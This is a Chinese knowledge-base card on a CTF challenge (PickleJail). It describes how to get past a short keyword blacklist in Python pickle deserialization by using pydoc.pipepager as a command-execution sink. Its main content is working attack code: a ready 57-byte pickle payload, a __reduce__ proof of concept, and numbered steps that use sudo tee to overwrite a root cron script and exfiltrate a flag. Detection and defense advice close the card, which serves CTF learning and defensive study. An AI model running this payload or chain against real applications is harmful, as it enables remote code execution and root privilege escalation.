---
id: web-python-deserialization-pickle-pydoc-pipepager-short-blacklist-bypass
title: Pickle 短黑名单绕过：pydoc.pipepager(text, cmd) 在 60 字节内执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-pydoc-pipepager-short-blacklist-bypass
aliases:
- PickleJail
- pydoc.pipepager
- pickle 黑名单绕过
- 60 字节 pickle
- 短 pickle RCE
- 关键字黑名单 pickle
tags:
- python
- pickle
- deserialization
- blacklist-bypass
- pydoc
- pipepager
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V114
  verified_at: '2026-11-06T02:04:36+08:00'
  notes: 已通读原文 PickleJail 段并核对：len(content)>60 限制、黑名单 [\n \r \ base builtin code command eval exec flag flask global os output popen pty repeat run setstate spawn subprocess sys system timeit]、pydoc.pipepager(text,cmd) 不在黑名单、57 字节 payload b'\x80\x04\x8c\x05pydoc\x8c\x09pipepager\x93\x8c\x0bcat /f*>/tx\x8c\x12sudo -n tee /o*/c*\x86R.' 均与原文一致；已复算长度 57。pydoc.pipepager 通过 subprocess(shell=True) 执行 cmd 并喂 stdin，与卡片描述一致。卡片把 pydoc.getpager 也列为同类 sink 略不精确（getpager 主要返回 pager 命令），但已用『是否可用取决于实现』限定，不影响主结论。PoC 未在本机执行；CTF 题无组件版本。
---

## 一句话结论

当应用对上传文件执行 `pickle.load()`、但只用一份很短的关键字黑名单（`os`、`system`、`exec`、`subprocess`、`popen`、`run`、`flag` 等）和 60 字节长度限制做防护时，可以用标准库 `pydoc.pipepager(text, cmd)` 作为命令执行 sink：它的名字不含黑名单词，内部会启动 pager 进程执行 `cmd`，一个 57 字节的 pickle 就能把命令跑起来。

## 原理

- pickle 的 `GLOBAL`/`STACK_GLOBAL` 操作码可以引用任意可导入的 callable；`REDUCE` 会以栈上的参数调用它。黑名单只检查上传内容里的字面量字节，不检查“这个 callable 实际会做什么”。
- `pydoc.pipepager(text, cmd)` 是标准库函数：它把 `text` 写入一个临时文件/管道，并启动 `cmd` 作为 pager 读取；`cmd` 由 `subprocess`/`os` 相关逻辑执行。函数名 `pydoc.pipepager` 不含 `os`、`system`、`exec`、`subprocess`、`popen`、`run` 等黑名单词。
- 构造 pickle：
  ```python
  b'\x80\x04\x8c\x05pydoc\x8c\x09pipepager\x93\x8c\x0bcat /f*>/tx\x8c\x12sudo -n tee /o*/c*\x86R.'
  ```
  长度 57 字节，不含换行/反斜杠/黑名单词；`text="cat /f*>/tx"`、`cmd="sudo -n tee /o*/c*"`。
- 触发后 `pydoc.pipepager` 执行 `sudo -n tee /opt/cleanup.sh`，把 `text`（`cat /f*>/tx`）写入 root 的 cron 脚本；cron 每分钟以 root 执行该脚本，把 `/flag` 复制到 `/tx`。
- 关键点不是 pickle 本身的新原语，而是“黑名单词表覆盖不足 + 标准库中存在非直观的命令执行函数”。同类 sink 还有 `pydoc.tempfilepager`、`pydoc.getpager`、`webbrowser`、`platform`、`ctypes` 等（是否可用取决于导入与环境）。

## 触发条件

- 应用对攻击者可控文件执行 `pickle.load()`（如管理员专属的预览、导入、缓存加载）。
- 上传过滤只做关键字黑名单，未使用 `RestrictedUnpickler`/`find_class` 白名单/HMAC 签名。
- 存在长度限制（如 60 字节），但标准库短 sink 可容纳。
- 目标环境可执行系统命令，且当前用户有可用的 sudo/cron 路径。
- 攻击者能进入触发 pickle 的权限分支（如管理员会话）。

## 利用步骤

1. 确认 pickle 入口与过滤规则：上传内容长度上限、黑名单词、是否检查换行/反斜杠。
2. 选择未被黑名单覆盖的短命令执行 sink：`pydoc.pipepager(text, cmd)`。
3. 构造 pickle：`GLOBAL pydoc pipepager` + 两个字符串参数 + `REDUCE`；用 `pickle.dumps`/手工字节控制总长度。
4. 上传 payload，触发 `pickle.load`；若返回 500 也检查副作用（命令可能已执行）。
5. 用执行结果写 root cron 脚本或直接读可读文件；等待 cron/systemd 触发。
6. 读取输出文件，确认 flag；清理上传文件与 cron 修改。

## PoC

```python
import pickle, base64

class Evil:
    def __reduce__(self):
        return (__import__("pydoc").pipepager,
                ("cat /f*>/tx", "sudo -n tee /o*/c*"))

payload = pickle.dumps(Evil(), protocol=4)
print(len(payload), base64.b64encode(payload).decode())
# 原始字节（57 字节）：
# b'\x80\x04\x8c\x05pydoc\x8c\x09pipepager\x93\x8c\x0bcat /f*>/tx\x8c\x12sudo -n tee /o*/c*\x86R.'
```

```text
上传 -> 管理员访问 /pic?pic=payload -> pydoc.pipepager 执行 sudo tee
/opt/cleanup.sh 被写成 "cat /f*>/tx"
cron root 每分钟执行 -> /tx 出现 flag
```

PoC 未在本机执行；`pydoc.pipepager` 的 pager 行为与 sudo 规则需按目标环境验证。

## 变体与关联

- 变体：`pydoc.tempfilepager`/`pydoc.getpager` 等标准库函数；只要黑名单未覆盖且能传命令即可。
- 变体：用 `builtins.eval`/`compile`/`getattr` 等短名字绕过关键字黑名单；或用 `pickle` 的 `INST`/`OBJ` 旧 opcode。
- 变体：长度限制可通过更短的模块/函数名、单字符变量、`__reduce__` 返回 `(callable, args)` 压缩。
- 关联卡片：[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle + CodeType 关键字黑名单绕过）、[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（find_class 白名单绕过）、[[pentest-privilege-escalation-sudo-nopasswd-tee-root-cron-script]]（本链的 sudo tee 提权步骤）。
- 注意：本例为 AI×Cybersecurity Challenge PickleJail；真实应用需具体分析 pickle 入口、过滤规则与标准库可调用 sink。

## 检测与防御

- 防御：不要对不可信数据使用 `pickle.load`；使用 JSON/MessagePack 等安全格式；如必须用 pickle，使用 `RestrictedUnpickler` + `find_class` 白名单 + HMAC 签名。
- 防御：不要用关键字黑名单作为安全边界；黑名单无法覆盖标准库的所有命令执行函数。
- 防御：上传文件与反序列化分离；管理员专属功能也要校验文件来源/签名；限制应用用户的 sudo 与 cron 写权限。
- 检测：上传内容中出现 `pydoc`、`pipepager`、`GLOBAL`/`STACK_GLOBAL`/`REDUCE` 等 pickle opcode；`/tmp` 临时文件；异常 pager/子进程；cron 脚本被修改。
- 响应：隔离应用、删除恶意文件、检查 cron/systemd/authorized_keys、轮换凭据、修复反序列化入口。
